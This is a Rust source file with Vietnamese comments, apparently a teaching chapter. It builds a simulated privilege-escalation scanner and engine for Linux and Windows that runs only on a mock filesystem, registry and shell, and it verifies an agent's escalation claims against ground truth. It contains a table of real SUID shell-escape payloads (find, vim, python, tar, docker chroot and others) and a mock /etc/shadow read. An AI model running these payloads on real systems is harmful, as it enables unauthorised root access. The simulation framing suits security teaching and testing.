//! # Chương 102: Động cơ Leo thang Đặc quyền — SUID/Sudo/Cron/Capabilities Linux, Token/Service/DLL Windows & Kiểm chứng Sự thật Nền
//! (Privilege Escalation Engine: Linux & Windows PrivEsc with Ground-truth Verification)
//!
//! Crate `ch102` là **động cơ leo thang đặc quyền** (privilege escalation engine) của
//! **Chủ đề 28** (An ninh Hệ thống & Tấn công Tự động). Toàn bộ mã nguồn được viết bằng
//! **Rust 2024 thuần `std`**, không có bất kỳ phụ thuộc crate ngoài nào (`[dependencies]` rỗng).
//!
//! Triết lý thiết kế lấy cảm hứng từ **hackingBuddyGPT**: một tác tử tấn công (agent) có thể
//! tự khai "tôi đã leo thang thành công", nhưng **không lời khai nào được tin là sự thật**.
//! Chỉ khi lệnh `whoami` thật trên vỏ lệnh mô phỏng trả về đúng người dùng kỳ vọng thì
//! [`GroundTruthVerifier`] mới cấp "bằng chứng nền" (ground truth).
//!
//! Các thành phần chính:
//!
//! - [`MockFilesystem`]: hệ thống tệp mô phỏng trong bộ nhớ, hiểu cờ SUID/SGID, quyền ghi
//!   theo nhóm, liên kết tượng và thư mục.
//! - [`MockRegistry`]: sổ đăng ký Windows mô phỏng (`HKLM\...\Services`, chính sách UAC, LSA).
//! - [`MockShell`]: vỏ lệnh mô phỏng biết `whoami`, `id`, `sudo -l`, `getcap`, `whoami /priv`...
//! - [`LinuxPrivEscChecker`]: dò SUID/SGID, `sudoers`, cron, Linux capabilities, đường dẫn
//!   ghi được bởi mọi người, xuất NFS `no_root_squash` và liên kết tượng nguy hiểm.
//! - [`WindowsPrivEscChecker`]: dò mạo danh token, đường dẫn dịch vụ không đặt trong ngoặc
//!   kép, quyền ghi yếu trên dịch vụ, `AlwaysInstallElevated`, chiếm quyền DLL và mật khẩu
//!   bản rõ.
//! - [`ExploitSuggester`]: sinh kế hoạch khai thác từ danh sách phát hiện, có thứ tự ưu tiên.
//! - [`GroundTruthVerifier`]: kiểm chứng sự thật nền, **từ chối** mọi lời khai tự báo cáo.
//! - [`PrivEscBenchmark`]: bộ 10 kịch bản chuẩn đo điểm năng lực của động cơ.
//! - [`PrivEscEngine`]: điều phối toàn bộ chu trình quét → lập kế hoạch → khai thác → kiểm chứng.
//!
//! **Lưu ý đạo đức**: mọi kiểm tra chạy trên dữ liệu tổng hợp tất định trong bộ nhớ
//! (`MockFilesystem`, `MockRegistry`, `MockShell`). Chương này **không** chạm vào bất kỳ hệ
//! thống thật nào, không mở socket ra ngoài và không đọc/ghi tệp trên đĩa.
#![allow(dead_code)]

use std::collections::{HashMap, HashSet};
use std::path::{Path, PathBuf};

// ============================================================================
// 1. TIỆN ÍCH ĐƯỜNG DẪN & HẰNG SỐ CHUẨN
// ============================================================================

/// Cờ bit `set-user-ID` trong trường `mode` của một tệp (tương đương `S_ISUID` trong POSIX).
///
/// Khi một tệp thực thi được gắn cờ này, tiến trình kế thừa quyền của **chủ sở hữu tệp**
/// thay vì quyền của người gọi. Đây là nền tảng của hàng loạt kỹ thuật leo thang quyền.
pub const S_IFUID: u32 = 0o4000;

/// Cờ bit `set-group-ID` trong trường `mode` của một tệp (tương đương `S_ISGID` trong POSIX).
pub const S_IFGID: u32 = 0o2000;

/// Người dùng mặc định đóng vai kẻ tấn công trong toàn bộ kịch bản mô phỏng.
pub const ATTACKER_USER: &str = "dev";

/// Danh tính đặc quyền cao nhất trên Windows, dùng làm "bằng chứng nền" cho kịch bản Windows.
pub const WINDOWS_SYSTEM_USER: &str = "NT AUTHORITY\\SYSTEM";

/// Danh tính đặc quyền cao nhất trên Linux, dùng làm "bằng chứng nền" cho kịch bản Linux.
pub const LINUX_ROOT_USER: &str = "root";

/// Các thư mục nằm trong `PATH` mặc định: ghi được vào đây đồng nghĩa với chiếm quyền thực thi.
pub const PATH_DIRECTORIES: [&str; 6] = [
    "/usr/local/bin",
    "/usr/bin",
    "/bin",
    "/usr/local/sbin",
    "/usr/sbin",
    "/sbin",
];

/// Trích xuất tên cuối cùng của một đường dẫn, hỗ trợ cả dấu phân cách `/` và `\`.
///
/// Trên Windows, dấu `\` là dấu phân cách thư mục; hàm này giúp các kiểm tra làm việc
/// giống nhau trên cả hai hệ điều hành mà không phụ thuộc `std::path::parent`.
pub fn base_name(path: &str) -> &str {
    match path.rfind(['/', '\\']) {
        Some(idx) => &path[idx + 1..],
        None => path,
    }
}

/// Trích xuất thư mục cha của một đường dẫn (không có dấu phân cách ở cuối).
///
/// Trả về chuỗi rỗng nếu đường dẫn không có phần thư mục cha.
pub fn parent_path(path: &str) -> String {
    match path.rfind(['/', '\\']) {
        Some(idx) => path[..idx].to_string(),
        None => String::new(),
    }
}

/// Nối hai thành phần đường dẫn, tự chọn dấu phân cách phù hợp với kiểu đường dẫn.
pub fn join_path(dir: &str, name: &str) -> String {
    if dir.is_empty() {
        return name.to_string();
    }
    let separator = if dir.contains('\\') && !dir.contains('/') {
        '\\'
    } else {
        '/'
    };
    format!("{dir}{separator}{name}")
}

/// Kiểm tra một đường dẫn có nằm **trực tiếp bên trong** một thư mục hay không.
///
/// Khác với `starts_with` thuần túy, hàm này yêu cầu ký tự ngay sau thư mục phải là dấu
/// phân cách, nhờ đó `"/usr/bin2/x"` không bị coi là nằm trong `"/usr/bin"`.
pub fn is_under_dir(path: &str, dir: &str) -> bool {
    if dir.is_empty() || path.len() <= dir.len() {
        return false;
    }
    if !path.starts_with(dir) {
        return false;
    }
    matches!(path.as_bytes()[dir.len()], b'/' | b'\\')
}

/// Kiểm tra một đường dẫn có phải là đường dẫn "nhạy cảm" hay không.
///
/// "Nhạy cảm" ở đây là các tệp cấu hình hệ thống mà việc ghi đè sẽ trực tiếp dẫn tới
/// quyền đọc mật khẩu băm, thay đổi cấu hình quyền, hoặc chèn mã thực thi.
pub fn is_sensitive_path(path: &str) -> bool {
    const SENSITIVE_TOKENS: [&str; 9] = [
        "/etc/passwd",
        "/etc/shadow",
        "/etc/sudoers",
        "/etc/cron",
        "/etc/ld.so",
        "/root/",
        "authorized_keys",
        "id_rsa",
        "/var/spool/cron",
    ];
    if path.starts_with("/etc/") {
        return true;
    }
    SENSITIVE_TOKENS.iter().any(|token| path.contains(token))
}

/// Bỏ cặp ngoặc kép bao quanh một đường dẫn Windows (nếu có).
pub fn unquote_path(path: &str) -> &str {
    let trimmed = path.trim();
    if trimmed.len() >= 2 && trimmed.starts_with('"') && trimmed.ends_with('"') {
        &trimmed[1..trimmed.len() - 1]
    } else {
        trimmed
    }
}

// ============================================================================
// 2. HỆ THỐNG TỆP MÔ PHỎNG (MOCK FILESYSTEM)
// ============================================================================

/// Một tệp (hoặc liên kết tượng) nằm trong [`MockFilesystem`].
#[derive(Debug, Clone)]
pub struct MockFile {
    /// Đường dẫn tuyệt đối của tệp.
    pub path: PathBuf,
    /// Nội dung tệp dạng byte thô.
    pub content: Vec<u8>,
    /// Quyền truy cập theo kiểu POSIX, bao gồm cả cờ SUID/SGID ở bit cao.
    pub mode: u32,
    /// Chủ sở hữu tệp (ví dụ `"root"`, `"SYSTEM"`, `"dev"`).
    pub owner: String,
    /// Nhóm sở hữu tệp.
    pub group: String,
    /// Cờ báo hiệu đây là liên kết tượng (symbolic link).
    pub is_symlink: bool,
    /// Đích của liên kết tượng, chỉ có giá trị khi `is_symlink == true`.
    pub symlink_target: Option<PathBuf>,
}

impl MockFile {
    /// Quyền ghi của "người khác" (other) — bit `0o002`.
    pub fn is_world_writable(&self) -> bool {
        self.mode & 0o002 != 0
    }

    /// Quyền thực thi của chủ sở hữu — bit `0o100`.
    pub fn is_owner_executable(&self) -> bool {
        self.mode & 0o100 != 0
    }

    /// Cờ SUID có được đặt hay không.
    pub fn has_suid(&self) -> bool {
        self.mode & S_IFUID != 0
    }

    /// Cờ SGID có được đặt hay không.
    pub fn has_sgid(&self) -> bool {
        self.mode & S_IFGID != 0
    }
}

/// Hệ thống tệp mô phỏng hoàn toàn trong bộ nhớ.
///
/// Hệ thống này là "phòng thí nghiệm" của chương: mọi lệnh dò lỗ hổng đều đọc từ đây,
/// không bao giờ chạm tới đĩa thật. Các quy ước quan trọng:
///
/// - Quyền được lưu trong `mode` theo đúng quy ước POSIX (`rwxr-xr-x` = `0o755`).
/// - Cờ SUID/SGID nằm ở hai bit cao (`0o4000` / `0o2000`) của cùng trường `mode`.
/// - **Capability của một tệp nhị phân được khai báo bằng tệp metadata `<đường-dẫn>.cap`**,
///   nội dung là danh sách capability dạng văn bản, ví dụ `cap_setuid,cap_net_raw=ep`.
///   Nhờ đó ta không cần thêm trường vào [`MockFile`] mà vẫn mô phỏng được
///   `getcap`/`setcap` một cách trung thực.
#[derive(Debug, Clone, Default)]
pub struct MockFilesystem {
    /// Tập các tệp, khóa là đường dẫn tuyệt đối.
    pub files: HashMap<PathBuf, MockFile>,
    /// Tập các thư mục đã biết tồn tại.
    pub dirs: HashSet<PathBuf>,
}

impl MockFilesystem {
    /// Tạo một hệ thống tệp rỗng.
    pub fn new() -> Self {
        Self::default()
    }

    /// Thêm một tệp thông thường vào hệ thống tệp.
    ///
    /// Các thư mục cha của tệp được tự động đăng ký vào [`MockFilesystem::dirs`].
    pub fn add_file(&mut self, path: &str, content: &[u8], mode: u32, owner: &str) -> &mut Self {
        let file_path = PathBuf::from(path);
        let file = MockFile {
            path: file_path.clone(),
            content: content.to_vec(),
            mode,
            owner: owner.to_string(),
            group: "root".to_string(),
            is_symlink: false,
            symlink_target: None,
        };
        self.files.insert(file_path.clone(), file);
        self.register_parents(&file_path);
        self
    }

    /// Thêm một thư mục vào hệ thống tệp.
    ///
    /// Tham số `mode` được chấp nhận để giữ đúng chữ ký API thống nhất với thực tế; vì
    /// [`MockFilesystem::dirs`] chỉ lưu tập đường dẫn nên quyền của thư mục không được lưu.
    pub fn add_dir(&mut self, path: &str, mode: u32) -> &mut Self {
        let _ = mode;
        let dir_path = PathBuf::from(path);
        self.dirs.insert(dir_path.clone());
        self.register_parents(&dir_path);
        self
    }

    /// Thêm một liên kết tượng trỏ tới `target`.
    pub fn add_symlink(&mut self, path: &str, target: &str) -> &mut Self {
        let link_path = PathBuf::from(path);
        let file = MockFile {
            path: link_path.clone(),
            content: Vec::new(),
            mode: 0o777,
            owner: "root".to_string(),
            group: "root".to_string(),
            is_symlink: true,
            symlink_target: Some(PathBuf::from(target)),
        };
        self.files.insert(link_path.clone(), file);
        self.register_parents(&link_path);
        self
    }

    /// Đăng ký toàn bộ thư mục cha của `path` vào tập thư mục.
    fn register_parents(&mut self, path: &Path) {
        let mut current = path.parent().map(|p| p.to_path_buf());
        while let Some(dir) = current {
            if dir.as_os_str().is_empty() {
                break;
            }
            self.dirs.insert(dir.clone());
            current = dir.parent().map(|p| p.to_path_buf());
        }
    }

    /// Tra cứu một tệp theo đường dẫn.
    pub fn get(&self, path: &str) -> Option<&MockFile> {
        self.files.get(&PathBuf::from(path))
    }

    /// Kiểm tra một đường dẫn có tồn tại (dưới dạng tệp hoặc thư mục) hay không.
    pub fn exists(&self, path: &str) -> bool {
        let key = PathBuf::from(path);
        self.files.contains_key(&key) || self.dirs.contains(&key)
    }

    /// Kiểm tra một tệp có cờ SUID hay không.
    pub fn is_suid(&self, path: &str) -> bool {
        self.get(path).is_some_and(|f| f.mode & S_IFUID != 0)
    }

    /// Kiểm tra một tệp có cờ SGID hay không.
    pub fn is_sgid(&self, path: &str) -> bool {
        self.get(path).is_some_and(|f| f.mode & S_IFGID != 0)
    }

    /// Kiểm tra một tệp có quyền ghi cho "mọi người" hay không (bit `0o002`).
    pub fn is_world_writable(&self, path: &str) -> bool {
        self.get(path).is_some_and(|f| f.mode & 0o002 != 0)
    }

    /// Kiểm tra người dùng `user` có thể ghi vào tệp hay không.
    ///
    /// Quy tắc mô phỏng (đơn giản hoá so với POSIX thật):
    /// 1. Nếu tệp ghi được cho mọi người → `true`.
    /// 2. Nếu `user` là chủ sở hữu → theo bit ghi của chủ sở hữu (`0o200`).
    /// 3. Nếu `user` thuộc nhóm sở hữu → theo bit ghi của nhóm (`0o020`).
    /// 4. Nếu không → `false`.
    pub fn is_writable_by(&self, path: &str, user: &str) -> bool {
        let Some(file) = self.get(path) else {
            return false;
        };
        if file.mode & 0o002 != 0 {
            return true;
        }
        if file.owner == user {
            return file.mode & 0o200 != 0;
        }
        if file.group == user {
            return file.mode & 0o020 != 0;
        }
        false
    }

    /// Liệt kê toàn bộ đường dẫn tệp theo thứ tự tất định (tăng dần).
    pub fn path_list(&self) -> Vec<PathBuf> {
        let mut list: Vec<PathBuf> = self.files.keys().cloned().collect();
        list.sort();
        list
    }

    /// Phân giải một chuỗi liên kết tượng thành đường dẫn đích cuối cùng.
    ///
    /// Trả về `None` khi:
    /// - đường dẫn không tồn tại,
    /// - đường dẫn **không phải** liên kết tượng (hàm này chỉ dành cho liên kết),
    /// - chuỗi liên kết bị "đứt" (đích không tồn tại),
    /// - chuỗi liên kết quá dài (vượt quá 32 bước — dấu hiệu vòng lặp).
    pub fn resolve_symlink(&self, path: &str) -> Option<PathBuf> {
        let start = PathBuf::from(path);
        let first = self.files.get(&start)?;
        if !first.is_symlink {
            // Đường dẫn bắt đầu không phải liên kết tượng — không có gì để phân giải.
            return None;
        }
        let mut current = start;
        for _ in 0..32 {
            let file = self.files.get(&current)?;
            if !file.is_symlink {
                // Đã đi hết chuỗi liên kết và tới được tệp thật.
                return Some(current);
            }
            let target = file.symlink_target.clone()?;
            current = target;
        }
        None
    }

    /// Liệt kê các tệp nhị phân SUID/SGID kèm payload GTFOBins nếu có.
    ///
    /// Kết quả là cặp `(đường dẫn, payload)` với payload là lệnh thoát shell tương ứng.
    pub fn suid_binaries_with_payloads(&self) -> Vec<(String, Option<String>)> {
        let mut out = Vec::new();
        let gtfo = gtfo_bins();
        for path in self.path_list() {
            let path_str = path.to_string_lossy().to_string();
            let Some(file) = self.files.get(&path) else {
                continue;
            };
            if file.is_symlink {
                continue;
            }
            if file.mode & (S_IFUID | S_IFGID) == 0 {
                continue;
            }
            let name = base_name(&path_str);
            let payload = gtfo
                .iter()
                .find(|(binary, _)| *binary == name)
                .map(|(_, payload)| (*payload).to_string());
            out.push((path_str, payload));
        }
        out
    }
}

// ============================================================================
// 3. SỔ ĐĂNG KÝ WINDOWS MÔ PHỎNG (MOCK REGISTRY)
// ============================================================================

/// Một khóa trong sổ đăng ký Windows mô phỏng.
#[derive(Debug, Clone, Default)]
pub struct RegistryKey {
    /// Đường dẫn đầy đủ của khóa (ví dụ `HKLM\SYSTEM\CurrentControlSet\Services\Foo`).
    pub path: String,
    /// Các cặp (tên giá trị, giá trị) thuộc khóa.
    pub values: HashMap<String, String>,
    /// Danh sách tên khóa con.
    pub subkeys: Vec<String>,
}

/// Sổ đăng ký Windows mô phỏng, hoàn toàn trong bộ nhớ.
///
/// Ba vùng đường dẫn được dùng nhiều nhất trong kiểm tra leo thang quyền:
///
/// - `HKLM\SYSTEM\CurrentControlSet\Services\<tên>`: cấu hình dịch vụ (`ImagePath`, `Start`,
///   `ServiceDll`, `ObjectName`).
/// - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`: chính sách UAC
///   (`EnableLUA`, `AlwaysInstallElevated`).
/// - `HKLM\SYSTEM\CurrentControlSet\Control\Lsa`: cấu hình LSA (`RestrictAnonymous`).
#[derive(Debug, Clone, Default)]
pub struct MockRegistry {
    /// Tập các khóa, khóa là đường dẫn đầy đủ.
    pub keys: HashMap<String, RegistryKey>,
}

impl MockRegistry {
    /// Tạo một sổ đăng ký rỗng.
    pub fn new() -> Self {
        Self::default()
    }

    /// Tạo một khóa (kèm toàn bộ khóa cha) nếu chưa tồn tại.
    pub fn create_key(&mut self, path: &str) -> &mut Self {
        let parts: Vec<&str> = path.split('\\').filter(|p| !p.is_empty()).collect();
        // Tạo và liên kết chuỗi khóa cha từ gốc tới lá.
        for depth in 1..parts.len() {
            let ancestor = parts[..depth].join("\\");
            let child = parts[depth].to_string();
            let key = self
                .keys
                .entry(ancestor.clone())
                .or_insert_with(|| RegistryKey {
                    path: ancestor,
                    values: HashMap::new(),
                    subkeys: Vec::new(),
                });
            if !key.subkeys.contains(&child) {
                key.subkeys.push(child);
            }
        }
        self.keys
            .entry(path.to_string())
            .or_insert_with(|| RegistryKey {
                path: path.to_string(),
                values: HashMap::new(),
                subkeys: Vec::new(),
            });
        self
    }

    /// Đặt một giá trị (chuỗi) cho một khóa, tạo khóa nếu chưa có.
    pub fn set_value(&mut self, key_path: &str, name: &str, value: &str) -> &mut Self {
        self.create_key(key_path);
        if let Some(key) = self.keys.get_mut(key_path) {
            key.values.insert(name.to_string(), value.to_string());
        }
        self
    }

    /// Đọc một giá trị chuỗi của một khóa.
    pub fn get_value(&self, key_path: &str, name: &str) -> Option<&str> {
        self.keys
            .get(key_path)
            .and_then(|key| key.values.get(name))
            .map(|value| value.as_str())
    }

    /// Kiểm tra một khóa có tồn tại hay không.
    pub fn key_exists(&self, path: &str) -> bool {
        self.keys.contains_key(path)
    }

    /// Liệt kê toàn bộ đường dẫn khóa theo thứ tự tất định (tăng dần).
    pub fn all_keys(&self) -> Vec<String> {
        let mut list: Vec<String> = self.keys.keys().cloned().collect();
        list.sort();
        list
    }

    /// Liệt kê các dịch vụ Windows đã đăng ký, cùng cấu hình của chúng.
    pub fn services(&self) -> Vec<ServiceConfig> {
        const PREFIX: &str = "HKLM\\SYSTEM\\CurrentControlSet\\Services\\";
        let mut out = Vec::new();
        for key_path in self.all_keys() {
            let Some(rest) = key_path.strip_prefix(PREFIX) else {
                continue;
            };
            if rest.is_empty() {
                continue;
            }
            let Some(key) = self.keys.get(&key_path) else {
                continue;
            };
            out.push(ServiceConfig {
                name: rest.to_string(),
                key_path: key_path.clone(),
                image_path: key.values.get("ImagePath").cloned().unwrap_or_default(),
                start: key.values.get("Start").cloned().unwrap_or_default(),
                service_dll: key.values.get("ServiceDll").cloned(),
                object_name: key.values.get("ObjectName").cloned(),
                values: key.values.clone(),
            });
        }
        out
    }
}

/// Cấu hình của một dịch vụ Windows được trích ra từ [`MockRegistry`].
#[derive(Debug, Clone)]
pub struct ServiceConfig {
    /// Tên ngắn của dịch vụ (phần sau `Services\`).
    pub name: String,
    /// Đường dẫn đầy đủ của khóa sổ đăng ký.
    pub key_path: String,
    /// Giá trị `ImagePath` — đường dẫn tới tệp thực thi của dịch vụ.
    pub image_path: String,
    /// Giá trị `Start` — kiểu khởi động (`2` = tự động, `3` = thủ công, `4` = vô hiệu).
    pub start: String,
    /// Giá trị `ServiceDll` nếu dịch vụ chạy dưới `svchost.exe`.
    pub service_dll: Option<String>,
    /// Giá trị `ObjectName` — tài khoản mà dịch vụ chạy dưới.
    pub object_name: Option<String>,
    /// Toàn bộ giá trị của khóa (dùng để dò mật khẩu bản rõ).
    pub values: HashMap<String, String>,
}

// ============================================================================
// 4. VỎ LỆNH MÔ PHỎNG (MOCK SHELL)
// ============================================================================

/// Vỏ lệnh mô phỏng — nguồn sự thật duy nhất về danh tính người dùng hiện tại.
///
/// Vỏ lệnh này **không** bao giờ tin lời khai của tác tử. `whoami` luôn trả về đúng
/// danh tính hiện hành của phiên làm việc, và [`GroundTruthVerifier`] dùng chính lệnh này
/// để kiểm chứng kết quả leo thang.
#[derive(Debug, Clone)]
pub struct MockShell {
    /// Danh tính người dùng hiện tại của phiên làm việc.
    pub current_user: String,
    /// Cờ đặc quyền (tương đương `uid = 0` trên Linux / `SYSTEM` trên Windows).
    pub is_root: bool,
    /// Tên máy chủ đang mô phỏng.
    pub host: String,
    /// Nhật ký lệnh đã thực thi dạng `(lệnh, đầu ra)`.
    pub history: Vec<(String, String)>,
}

impl Default for MockShell {
    fn default() -> Self {
        Self {
            current_user: ATTACKER_USER.to_string(),
            is_root: false,
            host: "mock-host".to_string(),
            history: Vec::new(),
        }
    }
}

impl MockShell {
    /// Tạo một vỏ lệnh mô phỏng với người dùng thường (`dev`).
    pub fn new() -> Self {
        Self::default()
    }

    /// Thực thi một lệnh trên vỏ lệnh mô phỏng và trả về đầu ra.
    ///
    /// Các lệnh được hiểu: `whoami`, `id`, `cat /etc/shadow`, `sudo -l`, `getcap <đường-dẫn>`,
    /// `systeminfo`, `whoami /priv`, `net session`. Mọi lệnh đều được ghi vào
    /// [`MockShell::history`] để kiểm toán được.
    ///
    /// Lưu ý: lệnh `getcap` ở đây chỉ trả về một capability **mô phỏng**; việc liệt kê
    /// capability thật của từng tệp trong hệ thống tệp là trách nhiệm của
    /// [`LinuxPrivEscChecker::check_capabilities`] (vì vỏ lệnh không giữ tham chiếu tới
    /// hệ thống tệp).
    pub fn execute(&mut self, command: &str) -> String {
        let cmd = command.trim();
        let output = Self::simulate(cmd, &self.current_user, self.is_root);
        self.history.push((cmd.to_string(), output.clone()));
        output
    }

    /// Mô phỏng đầu ra của một lệnh mà không ghi vào nhật ký.
    fn simulate(command: &str, current_user: &str, privileged: bool) -> String {
        if command == "whoami" {
            return current_user.to_string();
        }
        if command == "id" {
            return if privileged {
                "uid=0(root) gid=0(root) groups=0(root) context=root:root".to_string()
            } else {
                "uid=1000(dev) gid=1000(dev) groups=1000(dev) context=dev:dev".to_string()
            };
        }
        if command == "cat /etc/shadow" {
            return "root:$6$mocksalt$0a1b2c3d4e5f:19000:0:99999:7:::\ndev:$6$mocksalt$6f5e4d3c2b1a:19000:0:99999:7:::\n".to_string();
        }
        if command == "sudo -l" {
            return "User dev may run the following commands on this host:\n    (ALL) NOPASSWD: /usr/bin/find, /usr/bin/vim, /bin/bash".to_string();
        }
        if let Some(rest) = command.strip_prefix("getcap") {
            let target = rest.trim();
            if target.is_empty() {
                return "Usage: getcap <path>".to_string();
            }
            return format!("{target} cap_setuid,cap_dac_override=ep");
        }
        if command == "systeminfo" {
            return "Host Name:                 WIN-MOCK\nOS Name:                   Microsoft Windows Server 2019\nSystem Type:               x64-based PC\nService Pack:              1".to_string();
        }
        if command == "whoami /priv" {
            return "Privilege Name                            Description\nSeImpersonatePrivilege                   Enabled\nSeAssignPrimaryTokenPrivilege             Enabled\nSeBackupPrivilege                          Disabled".to_string();
        }
        if command == "net session" {
            return "Server Name            Sharing\nWIN-MOCK              C$     Default  ADMIN$  Default".to_string();
        }
        format!("[mock-shell] lệnh chưa được mô phỏng: {command}")
    }

    /// Trả về danh tính người dùng hiện tại (tương đương đầu ra của `whoami`).
    pub fn whoami(&self) -> &str {
        &self.current_user
    }

    /// Kiểm tra phiên làm việc hiện tại có đặc quyền hay không.
    pub fn is_privileged(&self) -> bool {
        self.is_root
    }

    /// Mô phỏng hành động leo thang đặc quyền theo tên kỹ thuật.
    ///
    /// Trả về `true` nếu kỹ thuật được hỗ trợ và phiên làm việc chuyển sang danh tính
    /// đặc quyền tương ứng:
    ///
    /// - Kỹ thuật Linux → `current_user = "root"`, `is_root = true`.
    /// - Kỹ thuật Windows → `current_user = "NT AUTHORITY\SYSTEM"`, `is_root = true`.
    ///
    /// Kỹ thuật không nằm trong bảng hỗ trợ sẽ **không** làm thay đổi trạng thái.
    pub fn escalate(&mut self, technique: &str) -> bool {
        const ESCALATION_TABLE: [(&str, &str); 14] = [
            ("SudoMisconfig", LINUX_ROOT_USER),
            ("SuidBinary", LINUX_ROOT_USER),
            ("SgidBinary", LINUX_ROOT_USER),
            ("CronJob", LINUX_ROOT_USER),
            ("Capabilities", LINUX_ROOT_USER),
            ("WorldWritablePath", LINUX_ROOT_USER),
            ("WritablePath", LINUX_ROOT_USER),
            ("NfsNoRootSquash", LINUX_ROOT_USER),
            ("WritableService", WINDOWS_SYSTEM_USER),
            ("TokenImpersonation", WINDOWS_SYSTEM_USER),
            ("AlwaysInstallElevated", WINDOWS_SYSTEM_USER),
            ("UnquotedServicePath", WINDOWS_SYSTEM_USER),
            ("DllHijack", WINDOWS_SYSTEM_USER),
            ("WeakServicePermissions", WINDOWS_SYSTEM_USER),
        ];
        for (name, user) in ESCALATION_TABLE {
            if name == technique {
                self.is_root = true;
                self.current_user = user.to_string();
                self.history
                    .push((format!("escalate:{technique}"), format!("granted:{user}")));
                return true;
            }
        }
        false
    }
}

// ============================================================================
// 5. MÔ HÌNH PHÁT HIỆN LỖ HỔNG (FINDING) & MỨC ĐỘ NGHIÊM TRỌNG
// ============================================================================

/// Mức độ nghiêm trọng của một phát hiện leo thang đặc quyền.
///
/// Thứ tự biến (derive `Ord`) được chọn cố ý theo trục rủi ro tăng dần, nhờ đó có thể
/// sắp xếp phát hiện bằng `sort_by(|a, b| b.severity.cmp(&a.severity))`.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    /// Chỉ mang tính thông tin, không dẫn tới leo thang.
    Info,
    /// Rủi ro thấp, cần nhiều điều kiện cộng lại mới khai thác được.
    Low,
    /// Rủi ro trung bình: có thể khai thác nếu kẻ tấn công đã có một foothold.
    Medium,
    /// Rủi ro cao: đường leo thang trực tiếp và dễ khai thác.
    High,
    /// Rủi ro nghiêm trọng: leo thang quyền tức thời, gần như chắc chắn thành công.
    Critical,
}

impl Severity {
    /// Biểu diễn dạng văn bản ngắn gọn (dùng khi in báo cáo).
    pub fn label(&self) -> &'static str {
        match self {
            Severity::Info => "INFO",
            Severity::Low => "LOW",
            Severity::Medium => "MEDIUM",
            Severity::High => "HIGH",
            Severity::Critical => "CRITICAL",
        }
    }
}

/// Nền tảng mà một phát hiện áp dụng.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Platform {
    /// Chỉ áp dụng cho Linux.
    Linux,
    /// Chỉ áp dụng cho Windows.
    Windows,
    /// Áp dụng cho cả hai nền tảng.
    Both,
}

/// Một phát hiện lỗ hổng leo thang đặc quyền.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Finding {
    /// Mã kỹ thuật, ví dụ `"SuidBinary"`, `"UnquotedServicePath"`.
    pub technique: String,
    /// Tiêu đề mô tả ngắn gọn.
    pub title: String,
    /// Mức độ nghiêm trọng.
    pub severity: Severity,
    /// Nền tảng áp dụng.
    pub platform: Platform,
    /// Đường dẫn (hoặc khóa sổ đăng ký) liên quan tới phát hiện.
    pub path: String,
    /// Mô tả chi tiết cơ chế.
    pub detail: String,
    /// Lệnh khai thác minh hoạ (chạy trên môi trường mô phỏng).
    pub exploit_command: String,
    /// Bằng chứng thô thu được từ hệ thống tệp/sổ đăng ký mô phỏng.
    pub evidence: String,
}

impl Finding {
    /// Tạo một phát hiện mới với các trường bắt buộc; các trường còn lại để trống.
    pub fn new(technique: &str, title: &str, severity: Severity, platform: Platform) -> Self {
        Self {
            technique: technique.to_string(),
            title: title.to_string(),
            severity,
            platform,
            path: String::new(),
            detail: String::new(),
            exploit_command: String::new(),
            evidence: String::new(),
        }
    }

    /// Gán đường dẫn liên quan và trả về chính phát hiện (để xây dựng theo chuỗi).
    pub fn with_path(mut self, path: impl AsRef<str>) -> Self {
        self.path = path.as_ref().to_string();
        self
    }

    /// Gán mô tả cơ chế và trả về chính phát hiện.
    pub fn with_detail(mut self, detail: impl AsRef<str>) -> Self {
        self.detail = detail.as_ref().to_string();
        self
    }

    /// Gán lệnh khai thác minh hoạ và trả về chính phát hiện.
    pub fn with_exploit(mut self, command: impl AsRef<str>) -> Self {
        self.exploit_command = command.as_ref().to_string();
        self
    }

    /// Gán bằng chứng thô và trả về chính phát hiện.
    pub fn with_evidence(mut self, evidence: impl AsRef<str>) -> Self {
        self.evidence = evidence.as_ref().to_string();
        self
    }
}

// ============================================================================
// 6. BẢNG GTFOBINS RÚT GỌN — PAYLOAD THOÁT SHELL CHO NHỊ PHÂN SUID
// ============================================================================

/// Bảng rút gọn của dự án GTFOBins: ánh xạ tên nhị phân → payload thoát shell.
///
/// Đây là **clean-room**: danh sách được biên soạn lại từ kiến thức công khai về hành vi
/// mặc định của các tiện ích Unix, tuyệt đối không sao chép mã nguồn của bất kỳ
/// framework khai thác nào. Mỗi payload chỉ dùng để **mô phỏng** trên vỏ lệnh giả lập.
pub fn gtfo_bins() -> Vec<(&'static str, &'static str)> {
    vec![
        ("find", "find . -exec /bin/sh -p \\; \\;"),
        ("vim", "vim -c ':!/bin/sh'"),
        ("perl", "perl -e 'exec \"/bin/sh\";'"),
        ("python", "python -c 'import os; os.system(\"/bin/sh\")'"),
        ("python3", "python3 -c 'import os; os.system(\"/bin/sh\")'"),
        ("awk", "awk 'BEGIN {system(\"/bin/sh\")}'"),
        ("less", "less &&!/bin/sh"),
        ("nmap", "nmap --interactive"),
        ("tar", "tar cf /dev/shm/x.tar --checkpoint=1 --exec=/bin/sh"),
        ("zip", "zip /tmp/x.zip /etc/passwd"),
        (
            "docker",
            "docker run -v /:/host --privileged -it alpine chroot /host",
        ),
        ("man", "man -k /bin/sh"),
        ("env", "env /bin/sh"),
        ("gdb", "gdb --args /bin/sh -p"),
        ("nano", "nano /etc/shadow"),
        ("vi", "vi -c ':!/bin/sh'"),
    ]
}

// ============================================================================
// 7. BỘ DÒ LỖ HỔNG LEO THANG QUYỀN TRÊN LINUX
// ============================================================================

/// Bộ dò lỗ hổng leo thang quyền trên nền tảng Linux.
///
/// Sáu hướng dò được hỗ trợ:
/// 1. Nhị phân SUID/SGID (kết hợp bảng [`gtfo_bins`]).
/// 2. Cấu hình `sudoers` cho phép chạy lệnh không cần mật khẩu.
/// 3. Cron job gọi tới script hoặc nhị phân ghi được bởi kẻ tấn công.
/// 4. Linux capabilities (`cap_setuid`, `cap_sys_admin`, `cap_dac_override`...).
/// 5. Đường dẫn ghi được bởi mọi người, đặc biệt là tệp nhạy cảm hoặc thư mục trong `PATH`.
/// 6. Xuất NFS với `no_root_squash`.
#[derive(Debug, Clone)]
pub struct LinuxPrivEscChecker {
    /// Hệ thống tệp mô phỏng đang được quét.
    pub fs: MockFilesystem,
